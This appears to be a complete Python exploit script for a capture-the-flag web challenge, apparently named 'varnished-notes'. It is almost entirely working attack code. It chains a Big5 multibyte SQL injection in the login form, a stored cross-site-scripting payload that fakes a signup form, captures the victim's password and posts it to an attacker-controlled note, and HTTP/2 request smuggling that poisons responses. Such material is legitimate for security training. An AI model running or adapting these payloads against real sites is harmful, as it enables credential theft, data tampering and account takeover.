#!/usr/bin/env python3
import argparse
import base64
import hashlib
import os
import secrets
import socket
import ssl
import struct
import time
from urllib.parse import quote, urlparse

import hpack
import hyperframe.frame as hf
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
NOTES_SALT_PREFIX = "varnished-notes:v1:"


def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode()


def to_hex(s: str | bytes) -> str:
    if isinstance(s, str):
        s = s.encode()
    return "0x" + s.hex()


def seal(key: bytes, plaintext: str) -> tuple[bytes, bytes]:
    nonce = secrets.token_bytes(12)
    ct = AESGCM(key).encrypt(nonce, plaintext.encode(), None)
    return nonce, ct


def derive_key(username: str, password: str) -> bytes:
    return hashlib.pbkdf2_hmac(
        "sha256",
        password.encode(),
        (NOTES_SALT_PREFIX + username).encode(),
        200000,
        32,
    )


class Exploit:
    def __init__(self, url: str):
        self.url = url.rstrip("/")
        parsed = urlparse(self.url)
        self.host = parsed.hostname or "localhost"
        self.port = parsed.port or 443
        self.attacker_session: requests.Session | None = None
        self.attacker_username = ""
        self.attacker_password = ""
        self.attacker_key_hex = ""

    def big5_sqli(self, session: requests.Session, injection_sql: str) -> None:
        payload = b"\xa1'; " + injection_sql.encode() + b" #"
        r = session.post(
            f"{self.url}/login",
            data={"username": b64e(payload), "key": "00" * 32},
            verify=False,
            timeout=8,
        )
        r.raise_for_status()

    def make_attacker_cookie(self) -> str:
        session = requests.Session()
        username = "atk_" + secrets.token_hex(5)
        password = "pw_" + secrets.token_hex(16)
        key = derive_key(username, password)
        key_hex = key.hex()
        username_b64 = b64e(username.encode())

        r = session.post(
            f"{self.url}/register",
            data={"username": username_b64, "key": key_hex},
            verify=False,
            allow_redirects=False,
            timeout=8,
        )
        if r.status_code != 302:
            raise RuntimeError(f"register failed: {r.status_code}")

        attacker_username_b64 = quote(b64e(username.encode()))
        payload = (
            '<form onsubmit="event.preventDefault()">'
            '<input id=username>'
            '<input id=password type=password '
            "oninput=\"localStorage.setItem('notes_password',this.value)\">"
            '<button type=submit>Create account</button></form>'
            '<form onsubmit="event.preventDefault()">'
            '<textarea id=note></textarea>'
            '<button type=submit>Save</button></form>'
            '<img src=x onerror="setInterval(async()=>{'
            "if(window._saved||window._busy)return;"
            "let p=(document.getElementById('password')||{}).value"
            "||localStorage.getItem('notes_password')||'';"
            "if(!p)return;window._busy=1;"
            "try{"
            f"let e=await encryptField('{key_hex}','flag='+p);"
            f"let r=await fetch('/login',{{method:'POST',credentials:'include',"
            "headers:{'content-type':'application/x-www-form-urlencoded'},"
            f"body:'username={attacker_username_b64}&key={key_hex}'}});"
            "if(!r.ok)throw 1;"
            "r=await fetch('/note',{method:'POST',credentials:'include',"
            "headers:{'content-type':'application/x-www-form-urlencoded'},"
            "body:'enc_note='+encodeURIComponent(e)});"
            "if(!r.ok)throw 2;"
            "window._saved=1;document.title='saved';"
            "}catch(e){}window._busy=0;"
            '},25)">'
        )
        nonce, ct = seal(key, payload)
        sqli = (
            f"UPDATE users SET nonce={to_hex(b64e(nonce))}, "
            f"ciphertext={to_hex(b64e(ct))} WHERE username={to_hex(username)}"
        )
        self.big5_sqli(session, sqli)

        cookie = session.cookies.get("session")
        if not cookie:
            raise RuntimeError("no attacker session cookie")
        print(f"[*] attacker={username} cookie_len={len(cookie)}", flush=True)
        self.attacker_session = session
        self.attacker_username = username
        self.attacker_password = password
        self.attacker_key_hex = key_hex
        return cookie

    def poll_attacker_note(self) -> str | None:
        if self.attacker_session is None:
            raise RuntimeError("attacker session missing")
        r = self.attacker_session.get(f"{self.url}/note", verify=False, timeout=8)
        if r.status_code != 200:
            return None
        marker = "flag=grey{"
        idx = r.text.find(marker)
        if idx < 0:
            return None
        end = r.text.find("}", idx)
        if end < 0:
            return None
        return r.text[idx + len("flag=") : end + 1]

    def recv_frames(self, tls, timeout=1.0):
        tls.settimeout(timeout)
        buf = b""
        frames = []
        while True:
            try:
                data = tls.recv(65535)
            except Exception:
                break
            if not data:
                break
            buf += data
            while len(buf) >= 9:
                length = struct.unpack("!I", b"\x00" + buf[:3])[0]
                if len(buf) < 9 + length:
                    break
                raw = buf[: 9 + length]
                buf = buf[9 + length :]
                frame, _ = hf.Frame.parse_frame_header(memoryview(raw[:9]))
                frame.parse_body(memoryview(raw[9:]))
                frames.append(frame)
        return frames

    def h2_connect(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        tls = ctx.wrap_socket(
            socket.create_connection((self.host, self.port), timeout=8),
            server_hostname=self.host,
        )
        tls.sendall(H2_PREFACE)
        tls.sendall(hf.SettingsFrame(0).serialize())
        for frame in self.recv_frames(tls, 0.5):
            if isinstance(frame, hf.SettingsFrame) and "ACK" not in frame.flags:
                ack = hf.SettingsFrame(0)
                ack.flags.add("ACK")
                tls.sendall(ack.serialize())
        return tls

    @staticmethod
    def h2_headers(stream_id: int, headers) -> bytes:
        frame = hf.HeadersFrame(stream_id)
        frame.data = hpack.Encoder().encode(headers)
        frame.flags.add("END_HEADERS")
        return frame.serialize()

    @staticmethod
    def h2_data(stream_id: int, data: bytes) -> bytes:
        frame = hf.DataFrame(stream_id)
        frame.data = data
        frame.flags.add("END_STREAM")
        return frame.serialize()

    @staticmethod
    def sized_smuggled_note(total_len: int, cookie: str) -> bytes:
        base = (
            "GET /note HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            f"Cookie: session={cookie}\r\n"
            "Content-Length: "
        ).encode()
        for n in range(0, 4096):
            req = base + str(n).encode() + b"\r\n\r\n" + b"A" * n
            if len(req) == total_len:
                return req
        raise ValueError("could not size smuggled request")

    def poison(self, cookie: str, auto_prefix_len: int) -> None:
        min_req = (
            "GET /note HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            f"Cookie: session={cookie}\r\n"
            "Content-Length: 0\r\n\r\n"
        ).encode()
        target_len = max(len(min_req), auto_prefix_len + len("x-pad: \r\n"))
        while True:
            try:
                body = self.sized_smuggled_note(target_len, cookie)
                break
            except ValueError:
                target_len += 1

        xpad_len = target_len - auto_prefix_len - len("x-pad: \r\n")
        if xpad_len < 0:
            raise RuntimeError("negative padding")

        tls = self.h2_connect()
        headers = [
            (":method", "POST"),
            (":path", "/login"),
            (":scheme", "https"),
            ("content-type", "application/x-www-form-urlencoded"),
            ("content-length", str(target_len)),
            (":a", "xx"),
            ("x-pad", "A" * xpad_len),
        ]
        tls.sendall(self.h2_headers(1, headers))
        tls.sendall(self.h2_data(1, body))
        time.sleep(0.15)
        self.recv_frames(tls, 1.0)
        tls.close()
        print(f"[*] poisoned prefix={auto_prefix_len} cl={target_len} xpad={xpad_len}", flush=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="challenge URL, for example https://localhost:33334")
    parser.add_argument("--prefixes", default="56")
    parser.add_argument("--delay", type=float, default=12.0)
    parser.add_argument("--timeout", type=float, default=300.0)
    args = parser.parse_args()

    import urllib3

    urllib3.disable_warnings()

    print("[*] exfil mode: attacker note", flush=True)

    exploit = Exploit(args.url)
    cookie = exploit.make_attacker_cookie()
    prefixes = [int(x) for x in args.prefixes.split(",") if x.strip()]

    deadline = time.time() + args.timeout
    i = 0
    while time.time() < deadline:
        prefix = prefixes[i % len(prefixes)]
        i += 1
        exploit.poison(cookie, prefix)
        time.sleep(args.delay)
        for _ in range(4):
            flag = exploit.poll_attacker_note()
            if flag:
                print(f"[+] attacker note contains: {flag}", flush=True)
                print(flag)
                return
            time.sleep(0.5)
    else:
        raise SystemExit("[-] timed out waiting for exfil")


if __name__ == "__main__":
    main()
